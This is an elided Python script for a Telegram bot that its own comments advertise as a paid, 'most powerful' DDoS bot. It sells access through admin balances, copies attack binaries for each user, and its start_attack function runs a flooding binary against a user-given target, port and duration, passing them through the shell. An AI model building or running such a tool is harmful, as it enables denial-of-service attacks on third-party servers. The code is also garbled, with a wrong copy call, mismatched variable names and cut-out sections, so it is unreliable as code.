# SCRIPT MADE BY @DEVIL_vip_army ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
# SCRIPT MADE BY @DEVIL_vip_army ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
import telebot
import subprocess
import datetime
...
ORIGINAL_BGMI_PATH = '/workspaces/DEVIL-V5/bgmi'      #ADD YOUR FILES PATH HERE 
ORIGINAL_DEVIL_PATH = '/workspaces/Devil-V5/bgmi2'    #ADD YOUR FILES PATH HERE 
...
# SCRIPT MADE BY DEVIL ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT

                # Create copies of bgmi, sahil files for the new user
                user_bgmi_path = f'bgmi{user_id}'
                user_DEVIL_path = f'DEVIL{user_id}'
                DEVIL.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
                DEVIL.copy(ORIGINAL_DEVIL_PATH, user_DEVIL_path)
            ...
            if admin_balances[str(message.chat.id)] >= cost:
                ...
                # Create copies of bgmi,sahil files for the new user
                user_bgmi_path = f'bgmi{user_id}'              
                user_sahil_path = f'DEVIL{user_id}'
                shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
                shutil.copy(ORIGINAL_DEVIL_PATH, user_DEVIL_path)
...
def start_attack(user_id, target, port, duration):
    ...
    try:
        ...
        time.sleep(5)
        subprocess.run(f" ./bgmi2 {target} {port} {duration} 100", shell=True)
